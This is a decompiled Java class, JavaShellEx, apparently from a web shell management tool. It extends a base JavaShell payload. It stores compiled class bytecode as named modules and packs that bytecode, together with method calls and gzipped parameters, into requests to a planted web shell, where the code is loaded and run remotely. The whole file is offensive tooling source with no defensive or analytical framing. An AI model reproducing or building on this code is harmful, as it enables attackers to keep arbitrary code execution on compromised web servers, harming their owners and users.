/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.payloads.java;

import java.util.HashMap;
import shells.payloads.java.JavaShell;
import util.functions;
import util.http.ReqParameter;

public class JavaShellEx
extends JavaShell {
    private final HashMap<String, byte[]> moduleMap = new HashMap();

    @Override
    public boolean include(String codeName, byte[] binCode) {
        this.moduleMap.put(codeName, binCode);
        return true;
    }

    @Override
    public byte[] evalFunc(String className, String funcName, ReqParameter parameter) {
        if (className != null && className.trim().length() > 0) {
            if (this.moduleMap.get(className) != null) {
                ReqParameter evalNextData = new ReqParameter();
                evalNextData.add("codeName", className);
                evalNextData.add("binCode", this.moduleMap.get(className));
                parameter.add("evalClassName", className);
                parameter.add("methodName", funcName);
                evalNextData.add("evalNextData", functions.gzipE(parameter.formatEx()));
                return super.evalFunc(null, "include", evalNextData);
            }
            return "no include".getBytes();
        }
        return super.evalFunc(className, funcName, parameter);
    }
}

